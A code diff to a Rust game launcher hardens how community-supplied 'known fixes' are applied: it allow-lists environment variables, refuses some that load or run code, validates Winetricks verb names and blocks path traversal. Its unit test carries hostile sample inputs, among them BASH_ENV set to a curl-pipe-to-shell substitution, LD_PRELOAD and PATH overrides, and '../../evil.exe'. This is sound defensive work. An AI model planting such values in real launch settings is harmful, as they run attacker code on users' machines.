@@ -6,12 +6,13 @@
 //! just created or updated; `wiki_link` is written to the game log.
 
 use std::collections::BTreeMap;
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 use std::sync::Arc;
 use std::time::Duration;
 
 use anyhow::{Context as _, Result};
 use irori_core::Runner;
+use irori_core::archive_guard::relative_entry_path;
 use once_cell::sync::Lazy;
 use parking_lot::RwLock;
 use serde::{Deserialize, Serialize};
@@ -139,12 +140,104 @@ pub async fn data() -> Option<Arc<KnownFixesFile>> {
 
 /// Fixes for a game from the cached data.
 pub async fn lookup(runner: Runner, app_name: &str) -> Option<KnownFix> {
-    data().await?.get(runner, app_name).cloned()
+    Some(data().await?.get(runner, app_name)?.clone().confined())
+}
+
+/// Variable families that tune a compatibility layer or driver. The list of
+/// fixes is community data applied to launches without asking, so it must
+/// not reach `LD_PRELOAD`, `BASH_ENV`, `PATH` or the like.
+const FIX_VAR_PREFIXES: &[&str] = &[
+    "PROTON_", "DXVK_", "VKD3D_", "MESA_", "RADV_", "__GL_", "SDL_",
+];
+const FIX_VARS: &[&str] = &[
+    "USE_FAKE_EPIC_EXE",
+    "WINEDLLOVERRIDES",
+    "WINEESYNC",
+    "WINEFSYNC",
+    "WINE_LARGE_ADDRESS_AWARE",
+];
+/// In those families, but they run or load something.
+const FIX_VARS_REFUSED: &[&str] = &["PROTON_REMOTE_DEBUG_CMD", "SDL_DYNAMIC_API"];
+
+fn fix_var_allowed(key: &str) -> bool {
+    !FIX_VARS_REFUSED.contains(&key)
+        && (FIX_VARS.contains(&key) || FIX_VAR_PREFIXES.iter().any(|p| key.starts_with(p)))
+}
+
+/// A Winetricks component name; Winetricks runs `.verb` files as shell code.
+fn fix_verb_allowed(verb: &str) -> bool {
+    !verb.is_empty()
+        && !verb.starts_with('-')
+        && !verb.ends_with(".verb")
+        && verb
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '=' | '.' | '-'))
+}
+
+impl KnownFix {
+    /// Without what a fix has no business doing. Dropped entries are logged.
+    fn confined(mut self) -> Self {
+        let title = self.title.clone();
+        let refused = |what: &str, value: &str| {
+            tracing::warn!("known fix for {title}: ignoring {what} {value}");
+        };
+        self.env_variables.retain(|k, _| {
+            let keep = fix_var_allowed(k);
+            if !keep {
+                refused("the variable", k);
+            }
+            keep
+        });
+        self.winetricks.retain(|v| {
+            let keep = fix_verb_allowed(v);
+            if !keep {
+                refused("the component", v);
+            }
+            keep
+        });
+        self.run_in_prefix.retain(|f| {
+            let keep = relative_entry_path(Path::new(f)).is_some();
+            if !keep {
+                refused("the file", f);
+            }
+            keep
+        });
+        self
+    }
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn fixes_stay_within_what_a_fix_may_do() {
+        let fix = KnownFix {
+            env_variables: [
+                ("USE_FAKE_EPIC_EXE", "1"),
+                ("PROTON_NO_ESYNC", "1"),
+                ("LD_PRELOAD", "/x.so"),
+                ("BASH_ENV", "$(curl x|sh)"),
+                ("PATH", "/evil"),
+                ("PROTON_REMOTE_DEBUG_CMD", "/evil"),
+            ]
+            .into_iter()
+            .map(|(k, v)| (k.to_string(), v.to_string()))
+            .collect(),
+            winetricks: vec!["vcrun2022".into(), "/tmp/evil.verb".into(), "x.verb".into()],
+            run_in_prefix: vec![
+                "redist/vc.exe".into(),
+                "/bin/evil".into(),
+                "../../evil.exe".into(),
+            ],
+            ..Default::default()
+        }
+        .confined();
+        let keys: Vec<_> = fix.env_variables.keys().map(String::as_str).collect();
+        assert_eq!(keys, ["PROTON_NO_ESYNC", "USE_FAKE_EPIC_EXE"]);
+        assert_eq!(fix.winetricks, ["vcrun2022"]);
+        assert_eq!(fix.run_in_prefix, ["redist/vc.exe"]);
+    }
 
     const FIXTURE: &str = r#"{
       "amazon": {},
